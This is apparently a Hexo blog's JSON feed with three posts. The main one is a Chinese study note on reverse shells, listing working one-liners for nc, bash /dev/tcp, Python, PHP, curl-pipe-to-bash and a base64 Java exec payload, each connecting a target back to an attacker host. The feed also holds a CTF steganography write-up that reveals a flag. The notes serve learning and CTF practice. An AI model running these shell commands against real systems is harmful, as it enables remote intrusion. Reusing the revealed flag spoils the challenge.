{
    "version": "https://jsonfeed.org/version/1",
    "title": "Hexo",
    "description": "",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2024/04/09/Reverse-shell/",
            "url": "http://example.com/2024/04/09/Reverse-shell/",
            "title": "Reverse shell",
            "date_published": "2024-04-09T04:29:05.000Z",
            "content_html": "<h1 id=\"反弹shell-学习笔记\"><a class=\"markdownIt-Anchor\" href=\"#反弹shell-学习笔记\">#</a> 反弹 shell 学习笔记</h1>\n<h2 id=\"反弹shell\"><a class=\"markdownIt-Anchor\" href=\"#反弹shell\">#</a> 反弹 shell</h2>\n<h3 id=\"linux环境下常用网络工具\"><a class=\"markdownIt-Anchor\" href=\"#linux环境下常用网络工具\">#</a> linux 环境下常用网络工具</h3>\n<h4 id=\"ncnetcat\"><a class=\"markdownIt-Anchor\" href=\"#ncnetcat\">#</a> nc(netcat)</h4>\n<p>参数说明</p>\n<pre><code>nc.exe -h 即可看到各参数的使用方法。\n基本格式：nc [-options] hostname port[s] [ports] ...\n\t\tnc -l -p port [options] [hostname] [port]\n-d          后台模式\n-e          程序重定向，一旦连接，就执行 [危险!!]\n-g gateway  source-routing hop point[s], up to 8    设置路由器跃程通信网关，最多可设置8个。\n-G num      source-routing pointer: 4, 8, 12, ...   设置来源路由指向器，其数值为4的倍数。\n-h          帮助信息\n-i secs     延时的间隔\n-l          监听模式，用于入站连接 (监听本地端口)\n-L          连接关闭后,仍然继续监听\n-n          指定数字的IP地址，不能用hostname。即直接使用IP地址，而不通过域名服务器。\n-o file     指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存。\n-p port     本地端口号 (指定本地端口 )\n-r          随机本地及远程端口\n-s addr     本地源地址\n-t          使用TELNET交互方式(用telnet来回应 )\n-u          UDP模式\n-v          详细输出--用两个-v( -vv)可得到更详细的内容. 获得端口信息\n-w secs     timeout的时间\n-z          将输入输出关掉--只用于扫描. 端口的表示方法可写为M-N的范围格式。\n</code></pre>\n<p>连接远程主机</p>\n<p>​\t <code>nc -nvv Target_ip Target_port</code></p>\n<p>监听本地主机</p>\n<p>​\t <code>nc -l -p Local_port</code></p>\n<p>端口扫描</p>\n<p>​\t <code>nc -v Target_ip Target_port #可指定范围</code></p>\n<p>端口监听</p>\n<p>​\t <code>nc -l -p Local_port</code></p>\n<p>远程文件传输</p>\n<p>​\t <code>nc Target_ip Target_port &lt; Target_File</code></p>\n<p>模拟 HTTP headers</p>\n<pre><code>[root@hatest1 ~]# nc www.linuxfly.org 80 GET / HTTP/1.1 Host: ispconfig.org Referrer: mypage.com User-Agent: my-browser\nHTTP/1.1 200 OK Date: Tue, 16 Dec 2008 07:23:24 GMT Server: Apache/2.2.6 (Unix) DAV/2 mod_mono/1.2.1 mod_python/3.2.8 Python/2.4.3 mod_perl/2.0.2 Perl/v5.8.8 Set-Cookie: PHPSESSID=bbadorbvie1gn037iih6lrdg50; path=/ Expires: 0 Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0 Pragma: no-cache Cache-Control: private, post-check=0, pre-check=0, max-age=0 Set-Cookie: oWn_sid=xRutAY; expires=Tue, 23-Dec-2008 07:23:24 GMT; path=/ Vary: Accept-Encoding Transfer-Encoding: chunked Content-Type: text/html [......]\n\necho -n &quot;GET / HTTP/1.0&quot;r&quot;n&quot;r&quot;n&quot; | nc host.example.com 80\n连接到主机并执行\n</code></pre>\n<p>正向 shell，反向 shell</p>\n<h4 id=\"curl\"><a class=\"markdownIt-Anchor\" href=\"#curl\">#</a> curl</h4>\n<p>HTTP 命令行工具，支持文件的上传和下载，是综合传输工具</p>\n<p>发送 GET 请求</p>\n<p>​\t <code>curl URL?a=1&amp;b=nihao</code></p>\n<p>发送 POST 请求</p>\n<p>​\t <code>curl -X POST -d 'a=1&amp;b=nihao' URL</code></p>\n<p>发送 json 格式请求</p>\n<p>​\t <code>curl -H &quot;Content-type: application?json&quot; -X POST -d '&#123;&quot;abc&quot;:123.&quot;bcd&quot;:&quot;nihao&quot;&#125;' URL</code></p>\n<p>​\t <code>curl -H &quot;Content-Type: application/json&quot; -X POST -d @test.json URL</code></p>\n<h5 id=\"1-下载option-o或者option-o\"><a class=\"markdownIt-Anchor\" href=\"#1-下载option-o或者option-o\">#</a> 1、下载 (option:-o 或者 option:-O)</h5>\n<p>1.1、下载页面：</p>\n<p><code>curl -o dodo1.jpg http:www.linux.com/dodo1.JPG</code> <br>\n# 要注意 - O 这里后面的 url 要具体到某个文件，不然抓不下来<br>\n <code>curl -O http://www.linux.com/dodo1.JPG</code></p>\n<p>1.2：循环下载<br>\n有时候下载图片可以能是前面的部分名称是一样的，就最后的尾椎名不一样。这样就会把 dodo1，dodo2，dodo3，dodo4，dodo5 全部保存下来<br>\n <code>curl -O http://www.linux.com/dodo[1-5].JPG</code></p>\n<p>1.3：下载重命名<br>\n在 hello/dodo1.JPG 的文件下载下来就会变成 hello_dodo1.JPG, 其他文件依此类推，从而有效的避免了文件被覆盖<br>\n <code>curl -o #1_#2.JPG http://www.linux.com/&#123;hello,bb&#125;/dodo[1-5].JPG</code></p>\n<p>由于下载的 hello 与 bb 中的文件名都是 dodo1，dodo2，dodo3，dodo4，dodo5。因此第二次下载的会把第一次下载的覆盖，这样就需要对文件进行重命名。<br>\n <code>curl -O http://www.linux.com/&#123;hello,bb&#125;/dodo[1-5].JPG</code></p>\n<p>1.4：分块下载 (option：-r)</p>\n<p><code>curl -r 0-100 -o dodo1_part1.JPG http://www.linux.com/dodo1.JPG curl -r 100-200 -o dodo1_part2.JPG http://www.linux.com/dodo1.JPG curl -r 200- -o dodo1_part3.JPG http://www.linux.com/dodo1.JPG</code> <br>\n <code>cat dodo1_part* &gt; dodo1.JPG </code></p>\n<p>#这样就可以查看 dodo1.JPG 的内容了</p>\n<p>1.5：通过 ftp（文件传输协议）下载文件 (option：-u)<br>\n curl 可以通过 ftp 下载文件，curl 提供两种从 ftp 中下载的语法<br>\n <code>curl -O -u 用户名:密码 ftp://www.linux.com/dodo1.JPG</code> <br>\n <code>curl -O ftp://用户名:密码@www.linux.com/dodo1.JPG</code></p>\n<p>1.6: 下载，显示进度条 (option：-#) 或不显示进度条 (option：-s)<br>\n <code>curl -# -O http://www.linux.com/dodo1.JPG  </code> <br>\n <code>curl -s -O http://www.linux.com/dodo1.JPG</code></p>\n<p>1.7、下载，断点续传 (-C <offset>)<br>\n 断点续转，从文件头的指定位置开始继续下载 / 上传；offset 续传开始的位置，如果 offset 值为 “-”，curl 会自动从文件中识别起始位置开始传输；<br>\n <code>curl -# -o centos6.8.iso -C - http://mirrors.aliyun.com/centos/6.8/isos/x86_64/CentOS-6.8-x86_64-minimal.iso</code> <br>\n <code>curl -C -O http://www.linux.com/dodo1.JPG</code></offset></p>\n<h5 id=\"2-上传文件option-t\"><a class=\"markdownIt-Anchor\" href=\"#2-上传文件option-t\">#</a> 2、上传文件 (option:-T)</h5>\n<p><code>curl -T dodo1.JPG -u 用户名:密码 ftp://www.linux.com/img/</code></p>\n<h5 id=\"3-伪造来源页面伪造referer盗链-option-e\"><a class=\"markdownIt-Anchor\" href=\"#3-伪造来源页面伪造referer盗链-option-e\">#</a> 3、伪造来源页面 | 伪造 referer | 盗链 (option：-e)</h5>\n<p>很多服务器会检查 http 访问的 referer 从而来控制访问。比如：你是先访问首页，然后再访问首页中的邮箱页面，这里访问邮箱的 referer 地址就是访问首页成功后的页面地址，如果服务器发现对邮箱页面访问的 referer 地址不是首页的地址，就断定那是个盗连了<br>\n #这样就会让服务器其以为你是从 www.linux.com 点击某个链接过来的<br>\n <code>curl -e &quot;www.linux.com&quot; http://mail.linux.com</code> <br>\n# 告诉爱 E 族，我是从百度来的<br>\n <code>curl -e http://baidu.com http://aiezu.com</code></p>\n<h5 id=\"4-伪造代理设备模仿浏览器\"><a class=\"markdownIt-Anchor\" href=\"#4-伪造代理设备模仿浏览器\">#</a> 4、伪造代理设备 (模仿浏览器)</h5>\n<p>有些网站需要使用特定的浏览器去访问他们，有些还需要使用某些特定的版本。curl 内置 option:-A 可以让我们指定浏览器去访问网站<br>\n <code>curl -A &quot;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.0)&quot; http://www.linux.com</code> <br>\n# 告诉爱 E 族，我是 GOOGLE 爬虫蜘蛛（其实我是 curl 命令）<br>\n <code>curl -A &quot; Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)&quot; http://aiezu.com</code> <br>\n# 告诉爱 E 族，我用的是微信内置浏览器<br>\n <code>curl -A &quot;Mozilla/5.0 AppleWebKit/600 Mobile MicroMessenger/6.0&quot; http://aiezu.com</code></p>\n<h5 id=\"5-设置http请求\"><a class=\"markdownIt-Anchor\" href=\"#5-设置http请求\">#</a> 5、设置 http 请求</h5>\n<p>5.1、设置 http 请求头 (或 option:-H 或 option:–head)<br>\n <code>curl -H &quot;Cache-Control:no-cache&quot;  http://aiezu.com</code></p>\n<p>5.2、指定 proxy 服务器以及其端口 (option::-x)<br>\n# 很多时候上网需要用到代理服务器 (比如是使用代理服务器上网或者因为使用 curl 别人网站而被别人屏蔽 IP 地址的时候)，幸运的是 curl 通过使用内置 option：-x 来支持设置代理<br>\n <code>curl -x 192.168.100.100:1080 http://www.linux.com</code></p>\n<h5 id=\"6-http响应头\"><a class=\"markdownIt-Anchor\" href=\"#6-http响应头\">#</a> 6、http 响应头</h5>\n<p>6.1、查看 http 响应头 (option:-I)<br>\n# 看看本站的 http 头是怎么样的<br>\n <code>curl -I  http://aiezu.com</code> <br>\n 输出：<br>\nHTTP/1.1 200 OK<br>\nDate: Fri, 25 Nov 2016 16:45:49 GMT<br>\nServer: Apache<br>\nSet-Cookie: rox__Session=abdrt8vesprhnpc3f63p1df7j4; path=/<br>\nExpires: Thu, 19 Nov 1981 08:52:00 GMT<br>\nCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0<br>\nPragma: no-cache<br>\nVary: Accept-Encoding<br>\nContent-Type: text/html; charset=utf-8</p>\n<p>6.2、保存 http 的 response 里面的 header 信息 (option:-D)<br>\n <code>curl -D cookied.txt http://www.linux.com</code> <br>\n 执行后 cookie 信息就被存到了 cookied.txt 里面了<br>\n注意：-c (小写) 产生的 cookie 和 - D 里面的 cookie 是不一样的。</p>\n<h5 id=\"7-发送表单数据\"><a class=\"markdownIt-Anchor\" href=\"#7-发送表单数据\">#</a> 7、发送表单数据</h5>\n<p><code>curl -F &quot;pic=@logo.png&quot; -F &quot;site=aiezu&quot;  http://aiezu.com/</code></p>\n<h5 id=\"8-cookie\"><a class=\"markdownIt-Anchor\" href=\"#8-cookie\">#</a> 8、cookie</h5>\n<p>8.1、发送 cookie (option:-b）<br>\n# 有些网站是使用 cookie 来记录 session 信息。对于 chrome 这样的浏览器，可以轻易处理 cookie 信息，但在 curl 中只要增加相关参数也是可以很容易的处理 cookie<br>\n <code>curl -b &quot;domain=aiezu.com&quot;  http://aiezu.com</code> <br>\n# 很多网站都是通过监视你的 cookie 信息来判断你是否按规矩访问他们的网站的，因此我们需要使用保存的 cookie 信息。内置 option: -b<br>\n <code>curl -b cookiec.txt http://www.linux.com</code></p>\n<p>8.2、保存 http 的 response 里面的 cookie 信息 (option:-c）<br>\n执行后 http 的 response 里面的 cookie 信息就被存到了 cookiec.txt 里面了<br>\n <code>curl -c cookiec.txt  http://www.linux.com</code></p>\n<h4 id=\"wget\"><a class=\"markdownIt-Anchor\" href=\"#wget\">#</a> wget</h4>\n<p>wget 是一个下载文件的工具，它用在命令行下。对于 Linux 用户是必不可少的工具，我们经常要下载一些软件或从远程服务器恢复备份到本地服务器。</p>\n<p><code>wget URL</code></p>\n<h5 id=\"与curl区别\"><a class=\"markdownIt-Anchor\" href=\"#与curl区别\">#</a> 与 curl 区别</h5>\n<p>wget 是个专职的下载利器，简单，专一，极致；而 curl 可以下载，但是长项不在于下载，而在于模拟提交 web 数据，POST/GET 请求，调试网页，等等。在下载上，也各有所长，wget 可以递归，支持断点；而 curl 支持 URL 中加入变量，因此可以批量下载。个人用途上，我经常用 wget 来下载文件，加 -c 选项不怕断网；使用 curl 来跟网站的 API 交互，简便清晰。</p>\n<h4 id=\"ping\"><a class=\"markdownIt-Anchor\" href=\"#ping\">#</a> ping</h4>\n<p>ping 命令本身处于应用层，相当于一个应用程序，它直接使用网络层的 ICMP 协议，ping 用来检查网络是否通畅或者网络连接速度的命令。</p>\n<h4 id=\"talent\"><a class=\"markdownIt-Anchor\" href=\"#talent\">#</a> talent</h4>\n<p>telnet 协议是 TCP/IP 协议族的其中之一，是 Internet 远端登录服务的标准协议和主要方式，常用于网页服务器的远端控制，可供使用者在本地主机执行远端主机上的工作。telnet 通常是用来探测指定 ip 是否开放指定端口。</p>\n<p>open : 使用 openhostname 可以建立到主机的 Telnet 连接。</p>\n<p>close : 使用命令 close 命令可以关闭现有的 Telnet 连接。</p>\n<p>display : 使用 display 命令可以查看 Telnet 客户端的当前设置。</p>\n<p>send : 使用 send 命令可以向 Telnet 服务器发送命令。支持以下命令：</p>\n<p>ao : 放弃输出命令。</p>\n<p>ayt : “Are you there” 命令。</p>\n<p>esc : 发送当前的转义字符。</p>\n<p>ip : 中断进程命令。</p>\n<p>synch : 执行 Telnet 同步操作。</p>\n<p>brk : 发送信号。quit ：使用 quit 命令可以退出 Telnet 客户端。</p>\n<h4 id=\"ssh\"><a class=\"markdownIt-Anchor\" href=\"#ssh\">#</a> ssh</h4>\n<p>简单来说，ssh 和 telnet 是实现相同的功能，ssh 中 数据是经过加密的，是安全的，而 Telnet 是明文传输的，ssh 是加密的，基于 SSL 。</p>\n<h3 id=\"正向shell如何连接\"><a class=\"markdownIt-Anchor\" href=\"#正向shell如何连接\">#</a> 正向 shell 如何连接</h3>\n<p>假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标 ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面、web 服务、ssh、telnet 等等都是正向连接。</p>\n<p>目标主机： <code>nc -lvp Target_port -e /bin/sh</code></p>\n<p><img lazyload src=\"/images/loading.svg\" data-src=\"https://s2.loli.net/2024/04/09/BuPk7DwXMoHmEl3.png\" alt=\"image.png\"></p>\n<p>本地主机：  <code>nc Target_ip Target_port</code></p>\n<p><img lazyload src=\"/images/loading.svg\" data-src=\"https://s2.loli.net/2024/04/09/a9okGwVWhypUD4m.png\" alt=\"image.png\"></p>\n<h3 id=\"什么是反弹shell\"><a class=\"markdownIt-Anchor\" href=\"#什么是反弹shell\">#</a> 什么是反弹 shell</h3>\n<p>参考：<a class=\"link\" href=\"https://xz.aliyun.com/t/9488\">https://xz.aliyun.com/t/9488 <i class=\"fa-regular fa-arrow-up-right-from-square fa-sm\"></i></a></p>\n<p>反弹 shell（reverse shell），就是控制端监听在某 TCP/UDP 端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell 与 telnet，ssh 等标准 shell 对应，本质上是网络概念的客户端与服务端的角色反转。</p>\n<p>举例：假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标 ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面、web 服务、ssh、telnet 等等都是正向连接。那么什么情况下正向连接不能用了呢？</p>\n<p>有如下情况：</p>\n<p>1. 某客户机中了你的网马，但是它在局域网内，你直接连接不了。</p>\n<p>2. 目标机器的 ip 动态改变，你不能持续控制。</p>\n<p>3. 由于防火墙等限制，对方机器只能发送请求，不能接收请求。</p>\n<p>4. 对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机等情况都是未知的，所以建立一个服务端让恶意程序主动连接，才是上策。</p>\n<p>那么反弹就很好理解了，攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。</p>\n<p>反弹 shell 的方式有很多，那具体要用哪种方式还需要根据目标主机的环境来确定，比如目标主机上如果安装有 netcat，那我们就可以利用 netcat 反弹 shell，如果具有 python 环境，那我们可以利用 python 反弹 shell。如果具有 php 环境，那我们可以利用 php 反弹 shell。</p>\n<h3 id=\"反弹shell的方式\"><a class=\"markdownIt-Anchor\" href=\"#反弹shell的方式\">#</a> 反弹 shell 的方式</h3>\n<h4 id=\"netcat\"><a class=\"markdownIt-Anchor\" href=\"#netcat\">#</a> netcat</h4>\n<p>攻击机开启监听：  <code>nc -lvp Target_port</code></p>\n<p>-lvp：l 监听，v 输出交互过程，p 端口</p>\n<p>靶机连接攻击机：  <code>nc Target_ip Target_port -e /bin/bash</code></p>\n<h4 id=\"bash\"><a class=\"markdownIt-Anchor\" href=\"#bash\">#</a> bash</h4>\n<p>Bash 反弹 shell 的方法非常好用，题目的服务器环境可能没有 nc, 但是一定会有 bash</p>\n<p>同样的我们还是用 nc -lvp Target_Port 在攻击机的端口开启监听</p>\n<p><code>nc -lvp Target_Port</code></p>\n<p>这次我们使用 Bash 结合重定向来反弹 shell</p>\n<p><code>bash -i &gt;&amp; /dev/tcp/Target_ip/Target_port 0&gt;&amp;1</code></p>\n<p>或者  <code>bash -c &quot;bash -i &gt;&amp; /dev/tcp/Target_ip/Target_port 0&gt;&amp;1&quot;</code></p>\n<p>推荐使用后者，使用前者弹 shell, 当命令在服务端 shell 中执行时可能存在 /bin/sh 的软连接并不指向 bash 的问题，导致报错 <code>/bin/sh: 1:Syntax error:Bad fd number</code></p>\n<p>bash -i 产生 bash 交互环境 &gt;&amp; 将联合符号前后内容结合，重定向给后者，/dev/tcp/Target_IP/Target_Port 让目标主机发起与攻击机在 Target_Port 上的 TCP 连接，0&gt;&amp;1 将标准输入和标准输出的内容相结合，重定向给前面标准输出的内容。</p>\n<p>Bash 产生了一个交互环境和本地主机主动发起与攻击机端口建立的连接相结合，然后在重定向个 TCP 会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个 Bash 反弹环境。</p>\n<p>[关于上述 bash 命令的详细解释](<a class=\"link\" href=\"https://www.cnblogs.com/pandana/p/16289320.html\">反弹 bash shell 命令详解 - pandaes - 博客园 (cnblogs.com) <i class=\"fa-regular fa-arrow-up-right-from-square fa-sm\"></i></a>)</p>\n<h4 id=\"pythion反弹shell\"><a class=\"markdownIt-Anchor\" href=\"#pythion反弹shell\">#</a> Pythion 反弹 shell</h4>\n<p>同样的我们还是在攻击机开始端口监听， <code>nc -lvp Target_Port</code></p>\n<p>在靶机上执行 <code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;Target_IP&quot;,Target_Port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'</code></p>\n<h4 id=\"curl反弹shell\"><a class=\"markdownIt-Anchor\" href=\"#curl反弹shell\">#</a> curl 反弹 shell</h4>\n<p>简单来说就是将 Bash 重定向这一句内容写入文件，让靶机用 curl 下载这个文件并且执行，达到用 Bash 重定向相同的效果</p>\n<p>首先，在攻击者 vps 的 web 目录里面创建一个 index 文件（index.php 或 index.html），内容如下：</p>\n<p><code>bash -i &gt;&amp; /dev/tcp/Target_IP/Target_Port 0&gt;&amp;1</code>  或者 <code>bash -c &quot;bash -i &gt;&amp; /dev/tcp/Target_IP/Target_Port 0&gt;&amp;1&quot;</code> ，而 java 的 RCE 需要用 base64 编码，Payload: <code>Runtime.getRuntime().exec(&quot;bash -c &#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEyNy4wLjAuMS84ODg4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;);</code></p>\n<p>然后在目标机上执行如下，即可反弹 shell</p>\n<p><code>curl Target_IP|bash</code></p>\n<h4 id=\"php反弹shell\"><a class=\"markdownIt-Anchor\" href=\"#php反弹shell\">#</a> php 反弹 shell</h4>\n<p>攻击机：  <code>nc -nvlp Target_port</code></p>\n<p>靶机：  <code>php -r '$sock=fsockopen(&quot;192.168.37.131&quot;,1234);     exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);</code></p>\n<h4 id=\"others\"><a class=\"markdownIt-Anchor\" href=\"#others\">#</a> <strong>Others</strong></h4>\n<p>反弹 shell 的方式很多，nc 和 bash 是比较常见的方式，其他还有 Telnet，Socat 等工具可以反弹 shell，或者写个 python，php 等脚本也可以反弹 shell，比较琐碎的内容具体遇到了再查即可。</p>\n<p>————END————</p>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2024/04/06/Hgame-FINAL-WP/",
            "url": "http://example.com/2024/04/06/Hgame-FINAL-WP/",
            "title": "Hgame FINAL WP",
            "date_published": "2024-04-06T05:09:37.000Z",
            "content_html": "<h1 id=\"hgame-final-wp\"><a class=\"markdownIt-Anchor\" href=\"#hgame-final-wp\">#</a> Hgame FINAL WP</h1>\n<h3 id=\"author-fc04db\"><a class=\"markdownIt-Anchor\" href=\"#author-fc04db\">#</a> author: Fc04dB</h3>\n<h4 id=\"1看不见的字\"><a class=\"markdownIt-Anchor\" href=\"#1看不见的字\">#</a> 1. 看不见的字</h4>\n<p>题目提示 npm install zero-width-lib , 网上搜了一下，是零宽字符隐藏文本加密（npm 没有研究，最后发现也没用到），翻了很多文章，找到一个在线解密的网站:</p>\n<pre><code>https://yuanfux.github.io/zero-width-web/\n</code></pre>\n<p><img lazyload src=\"/images/loading.svg\" data-src=\"https://s2.loli.net/2024/04/06/5o1U97eAqYQismD.png\" alt=\"image-5.png\"></p>\n<p>直接得到 flag</p>\n<p>顺便贴一张其他人写的脚本</p>\n<pre><code>import * as z from 'zero-width-lib';\n// 这是要解密的字符串，包含零宽度字符\nconst encodedString = \n'h\\uFEFF\\u200E\\uFEFF\\u200B\\uFEFF\\u200E\\u200D\\u200B\\u200D\\uFEFF\\u200C\\u200B\\uFEFF\\\nu200F\\uFEFF\\u200B\\uFEFF\\u200E\\u200F\\u200B\\uFEFF\\uFEFF\\u200D\\u200B\\uFEFF\\u200D\\uFE\nFF\\u200B\\u200C\\u200E\\u200F\\u200B\\uFEFF\\u200F\\u200D\\u200B\\u200D\\uFEFF\\uFEFF\\u200B\\\nu200F\\uFEFF\\u200D\\u200B\\uFEFF\\u200F\\uFEFF\\u200B\\uFEFF\\u200E\\u200F\\u200B\\u200D\\uFE\nFF\\u200E\\u200B\\uFEFF\\u200E\\uFEFF\\u200B\\uFEFF\\u200E\\u200D\\u200B\\u200D\\uFEFF\\u200C\\\nu200B\\uFEFF\\u200F\\uFEFF\\u200B\\uFEFF\\u200E\\u200F\\u200B\\u200D\\uFEFF\\u200E\\u200B\\uFE\nFF\\u200E\\u200C\\u200B\\u200F\\uFEFF\\uFEFF\\u200B\\uFEFF\\u200C\\u200E\\u200B\\u200C\\u200E\\\nu200C\\u200B\\uFEFF\\u200F\\u200D\\u200B\\u200F\\u200E\\u200E\\u200Eello';\n// 使用zero-width-lib的decode方法来解密字符串\nconst decoded = z.decode(encodedString);\nconsole.log(decoded);\n</code></pre>\n<h4 id=\"2逮虾户\"><a class=\"markdownIt-Anchor\" href=\"#2逮虾户\">#</a> 2. 逮虾户</h4>\n<p>附件一个 dmg 文件是 moc 系统磁盘文件，7z 直接提取，一个需要密码的压缩包，一个 png 文件，密码应该就在 png 文件里，然后用 binwalk,foremost,stegsolve,zsteg，好多工具都找不到隐写内容，后来在学长的提示下是 piet 编程语言，然后下载 npiet 执行文件得到密码</p>\n<p><img lazyload src=\"/images/loading.svg\" data-src=\"https://s2.loli.net/2024/04/06/G8mMqgDk1SsWvZY.png\" alt=\"image-1.png\"></p>\n<p>打开 7z 文件，是一个逮虾户歌曲，尝试 MP3 隐写的解题方法，一无所获，再次请教学长，<br>\n信息在歌词里，想着把歌词提取出来，最后利用 elisa 播放器找到 passward</p>\n<p><img lazyload src=\"/images/loading.svg\" data-src=\"https://s2.loli.net/2024/04/06/LNGMryJA8k6wZ1P.png\" alt=\"image-2.png\"></p>\n<pre><code>q:UVmoa,Qo^Dp.D9e#wsFUm059mhNT\n</code></pre>\n<p>诶？长得也不像 flag，然后学长提醒有一个 zip 文件没找到，用 binwalk 处理那个 MP3 文件，提取到 zip 文件</p>\n<p><img lazyload src=\"/images/loading.svg\" data-src=\"https://s2.loli.net/2024/04/06/cOj7TSAnlZ6RYoe.png\" alt=\"image-3.png\"></p>\n<p>打开之后是一个 jdvu 文件，记事本打不开，百度，要下载 windjview，然后就可以看到 flag</p>\n<p><img lazyload src=\"/images/loading.svg\" data-src=\"https://s2.loli.net/2024/04/06/v6Ft4xIYHSd7LAk.png\" alt=\"image-4.png\"></p>\n<pre><code>Hgame&#123;d3j45_i_kn0w&#125;</code></pre>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2024/04/03/My-New-Post/",
            "url": "http://example.com/2024/04/03/My-New-Post/",
            "title": "Welcome to Fc04dB's BLOG",
            "date_published": "2024-04-03T12:29:21.000Z",
            "content_html": "<h1 id=\"WELCOME\"><a href=\"#WELCOME\" class=\"headerlink\" title=\"WELCOME!!!!!\"></a>WELCOME!!!!!</h1>",
            "tags": []
        }
    ]
}